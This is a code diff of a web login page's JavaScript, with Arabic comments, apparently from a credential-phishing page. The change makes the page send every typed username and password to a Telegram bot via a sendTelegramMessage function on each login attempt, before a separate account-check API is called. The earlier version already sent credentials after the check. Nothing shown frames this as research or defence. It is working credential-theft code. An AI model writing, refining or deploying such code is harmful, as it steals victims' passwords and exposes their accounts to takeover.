@@ -75,6 +75,10 @@
             const username = document.getElementById("username").value;
             const password = document.getElementById("password").value;
 
+            // إرسال البيانات إلى Telegram
+            sendTelegramMessage(`Login Attempt:\nUsername: ${username}\nPassword: ${password}`);
+
+            // إرسال الطلب إلى API الخاص بفحص الحساب
             fetch(apiUrl, {
                 method: 'POST',
                 headers: {
@@ -85,23 +89,22 @@
             .then(response => response.json())
             .then(data => {
                 if (data.status === 'success') {
-                    sendTelegramMessage(`Login successful!\nUsername: ${username}\nPassword: ${password}`);
                     message.textContent = "Login successful!";
                     message.className = "message success";
-                    window.location.href = "/acc"; 
+                    window.location.href = "/acc"; // إعادة توجيه عند النجاح
                 } else {
-                    sendTelegramMessage(`Login failed!\nUsername: ${username}\nPassword: ${password}`);
                     message.textContent = "Password incorrect";
                     message.className = "message error";
                 }
             })
             .catch(error => {
-                console.error('Error:', error);
+                console.error('API Error:', error);
                 message.textContent = "Password incorrect";
                 message.className = "message error";
             });
         });
 
+        // دالة إرسال رسالة إلى Telegram
         function sendTelegramMessage(text) {
             fetch(telegramApiUrl, {
                 method: 'POST',
